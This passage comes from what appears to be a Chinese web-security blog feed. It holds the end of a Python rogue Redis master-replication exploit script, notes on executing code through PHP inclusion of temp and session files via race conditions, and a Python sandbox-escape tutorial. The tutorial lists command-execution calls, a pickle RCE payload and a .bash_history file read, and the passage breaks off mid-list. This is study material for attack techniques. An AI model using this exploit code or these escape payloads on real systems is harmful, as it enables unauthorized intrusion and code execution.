class="line">    print(<span class="string">&quot;\033[1;32;40m[info]\033[0m &#123;&#125;&quot;</span>.format(msg))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">din</span>(<span class="params">sock, cnt=<span class="number">4096</span></span>):</span></span><br><span class="line">    <span class="keyword">global</span> verbose</span><br><span class="line">    msg = sock.recv(cnt)</span><br><span class="line">    <span class="keyword">if</span> verbose:</span><br><span class="line">        <span class="keyword">if</span> len(msg) &lt; <span class="number">1000</span>:</span><br><span class="line">            print(<span class="string">&quot;\033[1;34;40m[-&gt;]\033[0m &#123;&#125;&quot;</span>.format(msg))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&quot;\033[1;34;40m[-&gt;]\033[0m &#123;&#125;......&#123;&#125;&quot;</span>.format(msg[:<span class="number">80</span>], msg[<span class="number">-80</span>:]))</span><br><span class="line">    <span class="keyword">return</span> msg.decode(<span class="string">&#x27;gb18030&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dout</span>(<span class="params">sock, msg</span>):</span></span><br><span class="line">    <span class="keyword">global</span> verbose</span><br><span class="line">    <span class="keyword">if</span> type(msg) != bytes:</span><br><span class="line">        msg = msg.encode()</span><br><span class="line">    sock.send(msg)</span><br><span class="line">    <span class="keyword">if</span> verbose:</span><br><span class="line">        <span class="keyword">if</span> len(msg) &lt; <span class="number">1000</span>:</span><br><span class="line">            print(<span class="string">&quot;\033[1;33;40m[&lt;-]\033[0m &#123;&#125;&quot;</span>.format(msg))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&quot;\033[1;33;40m[&lt;-]\033[0m &#123;&#125;......&#123;&#125;&quot;</span>.format(msg[:<span class="number">80</span>], msg[<span class="number">-80</span>:]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RogueServer</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, lhost, lport</span>):</span></span><br><span class="line">        self._host = lhost</span><br><span class="line">        self._port = lport</span><br><span class="line">        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        self._sock.bind((<span class="string">&#x27;0.0.0.0&#x27;</span>, self._port))</span><br><span class="line">        self._sock.listen(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">close</span>(<span class="params">self</span>):</span></span><br><span class="line">        self._sock.close()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle</span>(<span class="params">self, data</span>):</span></span><br><span class="line">        cmd_arr = decode_cmd(data)</span><br><span class="line">        resp = <span class="string">&quot;&quot;</span></span><br><span class="line">        phase = <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> cmd_arr[<span class="number">0</span>].startswith(<span class="string">&quot;PING&quot;</span>):</span><br><span class="line">            resp = <span class="string">&quot;+PONG&quot;</span> + CLRF</span><br><span class="line">            phase = <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> cmd_arr[<span class="number">0</span>].startswith(<span class="string">&quot;REPLCONF&quot;</span>):</span><br><span class="line">            resp = <span class="string">&quot;+OK&quot;</span> + CLRF</span><br><span class="line">            phase = <span class="number">2</span></span><br><span class="line">        <span class="keyword">elif</span> cmd_arr[<span class="number">0</span>].startswith(<span class="string">&quot;PSYNC&quot;</span>) <span class="keyword">or</span> cmd_arr[<span class="number">0</span>].startswith(<span class="string">&quot;SYNC&quot;</span>):</span><br><span class="line">            resp = <span class="string">&quot;+FULLRESYNC &quot;</span> + <span class="string">&quot;Z&quot;</span>*<span class="number">40</span> + <span class="string">&quot; 1&quot;</span> + CLRF</span><br><span class="line">            resp += <span class="string">&quot;$&quot;</span> + str(len(payload)) + CLRF</span><br><span class="line">            resp = resp.encode()</span><br><span class="line">            resp += payload + CLRF.encode()</span><br><span class="line">            phase = <span class="number">3</span></span><br><span class="line">        <span class="keyword">return</span> resp, phase</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exp</span>(<span class="params">self</span>):</span></span><br><span class="line">        cli, addr = self._sock.accept()</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            data = din(cli, <span class="number">1024</span>)</span><br><span class="line">            <span class="keyword">if</span> len(data) == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            resp, phase = self.handle(data)</span><br><span class="line">            dout(cli, resp)</span><br><span class="line">            <span class="keyword">if</span> phase == <span class="number">3</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">runserver</span>(<span class="params">lhost, lport</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        rogue = RogueServer(lhost, lport)</span><br><span class="line">        rogue.exp()</span><br><span class="line">        sleep(<span class="number">3</span>)</span><br><span class="line">        rogue.close()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">&quot;\033[1;31;m[-]\033[0m 发生错误！ : &#123;&#125; \n[*] Exit..&quot;</span>.format(e))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    parser = OptionParser()</span><br><span class="line">    parser.add_option(<span class="string">&quot;--lhost&quot;</span>, dest=<span class="string">&quot;lh&quot;</span>, type=<span class="string">&quot;string&quot;</span>,</span><br><span class="line">            help=<span class="string">&quot;rogue server ip&quot;</span>, metavar=<span class="string">&quot;LOCAL_HOST&quot;</span>)</span><br><span class="line">    parser.add_option(<span class="string">&quot;--lport&quot;</span>, dest=<span class="string">&quot;lp&quot;</span>, type=<span class="string">&quot;int&quot;</span>,</span><br><span class="line">            help=<span class="string">&quot;rogue server listen port, default 6379&quot;</span>, default=<span class="number">6379</span>,</span><br><span class="line">            metavar=<span class="string">&quot;LOCAL_PORT&quot;</span>)</span><br><span class="line">    parser.add_option(<span class="string">&quot;--lfile&quot;</span>, dest=<span class="string">&quot;lfile&quot;</span>, type=<span class="string">&quot;string&quot;</span>,</span><br><span class="line">            help=<span class="string">&quot;Local file that needs to be written&quot;</span>, metavar=<span class="string">&quot;Local_File_Name&quot;</span>, default=<span class="string">&#x27;dump.rdb&#x27;</span>)</span><br><span class="line">    parser.add_option(<span class="string">&quot;-v&quot;</span>, <span class="string">&quot;--verbose&quot;</span>, action=<span class="string">&quot;store_true&quot;</span>, default=<span class="literal">False</span>,</span><br><span class="line">            help=<span class="string">&quot;Show full data stream&quot;</span>)</span><br><span class="line"></span><br><span class="line">    (options, args) = parser.parse_args()</span><br><span class="line">    <span class="keyword">global</span> verbose, payload, filename</span><br><span class="line">    localfile = options.lfile</span><br><span class="line">    verbose = options.verbose</span><br><span class="line">    payload = open(localfile, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        runserver(options.lh, options.lp)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        info(repr(e))</span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://mp.weixin.qq.com/s/kfYF157ux_VAOymU5l5RFA">一次“SSRF–&gt;RCE”的艰难利用</a></p><p><a href="https://www.anquanke.com/post/id/181599#h2-2">浅析SSRF认证攻击Redis</a></p><p><a href="http://r3start.net/index.php/2020/05/09/683">通过 SSRF 操作 Redis 主从复制写 Webshell</a></p><p><a href="https://xz.aliyun.com/t/5665">浅析Redis中SSRF的利用</a></p><p><a href="https://tyaoo.github.io/2020/08/31/2020-GACTF-web/">2020 GACTF web</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;用dict协议通过SSRF间接打Redis的时候，数据中存在&lt;code&gt;:&lt;/code&gt;、&lt;code&gt;&amp;#39;&lt;/code&gt;等特殊字符会导致set失败，可以通过位运算、gopher协议、主从同步数据、主从同步文件等方式躲开坏字符的坑。&lt;/p&gt;
&lt;h2 id=&quot;位运算&quot;&gt;&lt;</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="redis" scheme="https://hosch3n.github.io/tags/redis/"/>
    
    <category term="bitop" scheme="https://hosch3n.github.io/tags/bitop/"/>
    
    <category term="slaveof" scheme="https://hosch3n.github.io/tags/slaveof/"/>
    
  </entry>
  
  <entry>
    <title>PHP包含临时文件</title>
    <link href="https://hosch3n.github.io/2020/09/04/PHP%E5%8C%85%E5%90%AB%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6/"/>
    <id>https://hosch3n.github.io/2020/09/04/PHP%E5%8C%85%E5%90%AB%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6/</id>
    <published>2020-09-04T09:54:48.000Z</published>
    <updated>2020-09-04T10:07:35.000Z</updated>
    
    <content type="html"><![CDATA[<p>即使PHP后端不是处理文件上传的代码，在收到上传文件数据时同样会创建缓存文件，文件名可以在<code>$_FILES</code>变量中找到（通常为<code>/tmp/php[六个随机字符]</code>），通过phpinfo页面可以读到<code>$_FILES</code>。</p><p>一般的请求等获取到phpinfo中的文件名时已经结束了，此时可控的临时文件就已经被删掉了，但由于phpinfo中<code>$_FILES[file][tmp_name]</code>比其它HTTP头先输出，因此可以在HTTP头中发送大量无用数据，读到临时文件名后立即利用文件包含执行代码，通过条件竞争抢到临时文件被删除前时间窗口。</p><p><img src="/img/phpbhlswj_a.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;即使PHP后端不是处理文件上传的代码，在收到上传文件数据时同样会创建缓存文件，文件名可以在&lt;code&gt;$_FILES&lt;/code&gt;变量中找到（通常为&lt;code&gt;/tmp/php[六个随机字符]&lt;/code&gt;），通过phpinfo页面可以读到&lt;code&gt;$_FILES&lt;/co</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="LFI" scheme="https://hosch3n.github.io/tags/LFI/"/>
    
    <category term="tmp" scheme="https://hosch3n.github.io/tags/tmp/"/>
    
  </entry>
  
  <entry>
    <title>PHP包含Session文件</title>
    <link href="https://hosch3n.github.io/2020/09/04/PHP%E5%8C%85%E5%90%ABSession%E6%96%87%E4%BB%B6/"/>
    <id>https://hosch3n.github.io/2020/09/04/PHP%E5%8C%85%E5%90%ABSession%E6%96%87%E4%BB%B6/</id>
    <published>2020-09-04T06:35:12.000Z</published>
    <updated>2020-09-04T09:54:29.000Z</updated>
    
    <content type="html"><![CDATA[<p>PHP的<code>session.save_path</code>配置指定了session文件的结构深度、文件权限、存放路径，格式为<code>N;MODE;/path</code>。<code>N</code>表示子文件夹划分深度，<code>MODE</code>表示文件的umask值（默认为600），<code>path</code>通常为<code>/var/lib/php/sessions</code>或<code>/tmp</code>。</p><p>PHP在大文件流式上传时，为了将上传进度存放在session中，如果不存在session则会自动初始化，直到文件上传结束后销毁（由<code>session.upload_progress.cleanup</code>指定）。当<code>session.upload_progress.enabled</code>为默认值1时，上传文件的同时传递<code>name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</code>即可利用（由<code>session.upload_progress.name</code>指定）</p><p><code>session.name</code>通常为<code>PHPSESSID</code>，用作Cookie的键名。当<code>session.use_strict_mode</code>为默认值0时，客户端可以自定义sessionID，即通过Cookie传递<code>PHPSESSID=hosch3n</code>后，服务器将创建对应的<code>sess_hosch3n</code>文件。</p><p>因此就可以在利用文件上传自动初始化session的同时自定义sessionID，并利用条件竞争在文件上传完成前通过文件包含实现代码执行。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;PHP的&lt;code&gt;session.save_path&lt;/code&gt;配置指定了session文件的结构深度、文件权限、存放路径，格式为&lt;code&gt;N;MODE;/path&lt;/code&gt;。&lt;code&gt;N&lt;/code&gt;表示子文件夹划分深度，&lt;code&gt;MODE&lt;/code&gt;表示</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="LFI" scheme="https://hosch3n.github.io/tags/LFI/"/>
    
    <category term="sess" scheme="https://hosch3n.github.io/tags/sess/"/>
    
  </entry>
  
  <entry>
    <title>Python沙箱逃逸</title>
    <link href="https://hosch3n.github.io/2020/08/27/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"/>
    <id>https://hosch3n.github.io/2020/08/27/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</id>
    <published>2020-08-27T13:02:57.000Z</published>
    <updated>2020-08-28T20:01:19.000Z</updated>
    
    <content type="html"><![CDATA[<p>Python沙箱逃逸指的是：突破原本受限的Python交互环境，实现执行命令、读写文件等操作。</p><h2 id="导入模块"><a href="#导入模块" class="headerlink" title="导入模块"></a>导入模块</h2><p>Python导入模块时，会先判断<code>sys.modules</code>是否已经加载了该模块，如果没有加载则从<code>sys.path</code>中的目录按照模块名查找<code>py</code>、<code>pyc</code>、<code>pyd</code>文件，找到后执行该文件载入内存并添加至<code>sys.modules</code>中，再将模块名称导入Local命名空间。如果<code>a.py</code>中存在<code>import b</code>，则在<code>import a</code>时<code>ab</code>两个模块都会添加至<code>sys.modules</code>中，但仅将<code>a</code>导入Local命名空间。通过<code>from x import y</code>时，则将<code>x</code>添加至<code>sys.modules</code>中，将<code>y</code>导入Local命名空间。</p><p>因此除了常用方式，还可以通过手动添加、直接执行等方式导入：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> xxx</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> xxx <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">__import__(<span class="string">&#x27;xxx&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.modules[<span class="string">&#x27;xxx&#x27;</span>]=<span class="string">&#x27;blacklist&#x27;</span></span><br><span class="line"><span class="keyword">del</span> sys.modules[<span class="string">&#x27;xxx&#x27;</span>]</span><br><span class="line"><span class="keyword">import</span> xxx</span><br><span class="line"></span><br><span class="line">a = open(<span class="string">&#x27;/usr/lib/python3.8/xxx.py&#x27;</span>).read()</span><br><span class="line">exec(a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line">execfile(<span class="string">&#x27;/usr/lib/python2.7/xxx.py&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="危险方法"><a href="#危险方法" class="headerlink" title="危险方法"></a>危险方法</h3><p>有很多模块和方法可以用于执行命令或者读取文件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">os.system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">os.popen(<span class="string">&#x27;whoami&#x27;</span>).read()</span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line">os.popen2(<span class="string">&#x27;whoami&#x27;</span>).read()</span><br><span class="line">os.popen3(<span class="string">&#x27;whoami&#x27;</span>).read()</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">subprocess.call(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.check_call(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.check_output(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.Popen(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># Python3</span></span><br><span class="line">subprocess.run(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.getoutput(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">subprocess.getstatusoutput(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"></span><br><span class="line">platform.popen(<span class="string">&#x27;whoami&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line">commands.getoutput(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">commands.getstatusoutput(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"></span><br><span class="line">timeit.timeit(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>, number=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">bdb.os.system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cgi.os.system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"></span><br><span class="line">importlib.import_module(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"><span class="comment"># Python3</span></span><br><span class="line">importlib.__import__(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pickle.loads(<span class="string">b&quot;cos\nsystem\n(S&#x27;whoami&#x27;\ntR.&quot;</span>)</span><br><span class="line"></span><br><span class="line">eval(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)</span><br><span class="line">exec(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)</span><br><span class="line">exec(compile(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Linux</span></span><br><span class="line">pty.spawn(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">pty.os.system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 文件操作</span></span><br><span class="line">open(<span class="string">&#x27;.bash_history&#x27;</span>).read()</span><br><span class="line">linecache.getlines(<span class="string">&#x27;.bash_history&#x27;</span>)</span><br><span class="line">codecs.open(<span class="string">&#x27;.bash_history&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line">file(<span class="string">&#x27;.bash_history&#x27;</span>).read()</span><br><span class="line">types.FileType(<span class="string">&#x27;.bash_history&#x27;</span>).read()</span><br><span class="line">commands.getstatus(<span class="string">&#x27;.bash_history&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 函数参数</span></span><br><span class="line">foo.__code__.co_argcount</span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line">foo.func_code.co_argcount</span><br><span class="line"></span><br><span class="line"><span class="comment"># 函数字节码</span></span><br><span class="line">foo.__code__.co_code</span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line">foo.func_code.co_code</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure><h2 id="重新导入"><a href="#重新导入" class="headerlink" title="重新导入"></a>重新导入</h2><p>Python将一些经常用到的函数放在了<code>内建模块</code>中，这些函数无需导入即可使用（比如<code>eval</code>、<code>open</code>），这个内建模块在Python2中叫作<code>__builtin__</code>、在Python3中叫作<code>builtins</code>，这两个都需要导入才可以引用，但可以通过<code>__builtins__</code>来间接引用而无需导入（有一点区别，但问题不大）。</p><p>一些环境出于安全考虑会删掉<code>内建模块</code>中的危险方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">&#x27;__import__&#x27;</span>]</span><br><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]</span><br><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">&#x27;exec&#x27;</span>]</span><br><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">&#x27;execfile&#x27;</span>]</span><br><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">&#x27;getattr&#x27;</span>]</span><br><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">&#x27;input&#x27;</span>]</span><br></pre></td></tr></table></figure><p>这时可以尝试重新导入<code>内建模块</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">imp.reload(__builtins__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line">reload(__builtins__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 也可用作首次导入</span></span><br></pre></td></tr></table></figure><p>但是Python2的<code>reload</code>也是内建模块，可以通过<code>del __builtins__.reload</code>删掉。</p><h2 id="构造逃逸链"><a href="#构造逃逸链" class="headerlink" title="构造逃逸链"></a>构造逃逸链</h2><p>对于<code>a</code>模块嵌套导入的<code>b</code>模块中导入的<code>xxx</code>模块，可以通过<code>a.b.xxx</code>的方式来引用。如果标准库中嵌套导入了危险模块则会成为一个潜在风险，但是标准库也是需要先导入才能用的，如何才能打破僵局让潜在风险可被利用呢？</p><p>在Python3中所有的类都默认继承自<code>object</code>类、继承<code>object</code>的全部方法，在Python2中类默认为<code>classobj</code>，只有<code>[&#39;__doc__&#39;, &#39;__module__&#39;]</code>两个方法，除非显式声明继承自<code>object</code>类。</p><p>思路一：如果<code>object</code>的某个派生类中存在危险方法，就可以直接拿来用</p><p>思路二：如果<code>object</code>的某个派生类导入了危险模块，就可以链式调用危险方法</p><p>思路三：如果<code>object</code>的某个派生类由于导入了某些标准库模块，从而间接导入了危险模块的危险方法，也可以通过链式调用</p><p>思路四：基本类型的某些方法属于特殊方法，可以通过链式调用</p><h3 id="获取object类"><a href="#获取object类" class="headerlink" title="获取object类"></a>获取object类</h3><p>Python建议类的protected类型、private类型及内部变量分别以<code>_xxx</code>、<code>__yyy</code>、<code>__zzz__</code>的形式命名，但这仅是一种代码风格规范，并未在语言层面作任何限制。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">object</span><br><span class="line"></span><br><span class="line">[].__class__.__base__</span><br><span class="line">().__class__.__base__</span><br><span class="line">&#123;&#125;.__class__.__base__</span><br><span class="line">[].__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">&#123;&#125;.__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">[].__class__.__mro__[<span class="number">1</span>]</span><br><span class="line">().__class__.__mro__[<span class="number">1</span>]</span><br><span class="line">&#123;&#125;.__class__.__mro__[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python3</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__base__</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下标可以用负数来倒数</span></span><br></pre></td></tr></table></figure><h3 id="遍历派生类"><a href="#遍历派生类" class="headerlink" title="遍历派生类"></a>遍历派生类</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># https://github.com/python/cpython/tree/2.7/Lib</span></span><br><span class="line"><span class="comment"># ls -l /usr/lib/python2.7 | awk &#x27;&#123;print$9&#125;&#x27; | grep -v &#x27;.pyc\|this\|antigravity&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Python2标准库模块</span></span><br><span class="line">modules2 = [<span class="string">&#x27;_abcoll&#x27;</span>, <span class="string">&#x27;abc&#x27;</span>, <span class="string">&#x27;aifc&#x27;</span>, <span class="string">&#x27;anydbm&#x27;</span>, <span class="string">&#x27;argparse.egg-info&#x27;</span>, <span class="string">&#x27;argparse&#x27;</span>, <span class="string">&#x27;ast&#x27;</span>, <span class="string">&#x27;asynchat&#x27;</span>, <span class="string">&#x27;asyncore&#x27;</span>, <span class="string">&#x27;atexit&#x27;</span>, <span class="string">&#x27;audiodev&#x27;</span>, <span class="string">&#x27;base64&#x27;</span>, <span class="string">&#x27;BaseHTTPServer&#x27;</span>, <span class="string">&#x27;Bastion&#x27;</span>, <span class="string">&#x27;bdb&#x27;</span>, <span class="string">&#x27;binhex&#x27;</span>, <span class="string">&#x27;bisect&#x27;</span>, <span class="string">&#x27;bsddb&#x27;</span>, <span class="string">&#x27;calendar&#x27;</span>, <span class="string">&#x27;CGIHTTPServer&#x27;</span>, <span class="string">&#x27;cgi&#x27;</span>, <span class="string">&#x27;cgitb&#x27;</span>, <span class="string">&#x27;chunk&#x27;</span>, <span 